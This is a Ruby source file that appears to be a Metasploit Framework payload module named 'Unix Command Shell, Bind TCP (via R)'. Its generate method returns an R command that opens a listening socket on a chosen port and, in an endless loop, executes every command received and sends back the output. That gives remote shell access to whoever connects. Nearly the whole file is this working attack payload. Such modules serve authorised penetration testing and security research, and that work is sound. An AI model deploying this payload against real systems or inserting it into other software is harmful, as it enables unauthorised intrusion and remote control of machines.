##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/payload/r'
require 'msf/core/handler/bind_tcp'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module MetasploitModule

  CachedSize = 132

  include Msf::Payload::Single
  include Msf::Payload::R
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
      'Name'        => 'Unix Command Shell, Bind TCP (via R)',
      'Description' => 'Continually listen for a connection and spawn a command shell via R',
      'Author'      => [ 'RageLtMan' ],
      'License'     => MSF_LICENSE,
      'Platform'    => 'unix',
      'Arch'        => ARCH_CMD,
      'Handler'     => Msf::Handler::BindTcp,
      'Session'     => Msf::Sessions::CommandShell,
      'PayloadType' => 'cmd',
      'RequiredCmd' => 'R',
      'Payload'     => { 'Offsets' => {}, 'Payload' => '' }
    ))
  end

  def generate
    return prepends(r_string)
  end

  def prepends(r_string)
   return "R -e \"#{r_string}\""
  end

  def r_string
    return "s<-socketConnection(port=#{datastore['LPORT']}," +
    "blocking=TRUE,server=TRUE,open='r+');while(TRUE){writeLines(readLines" +
    "(pipe(readLines(s,1))),s)}"
  end
end
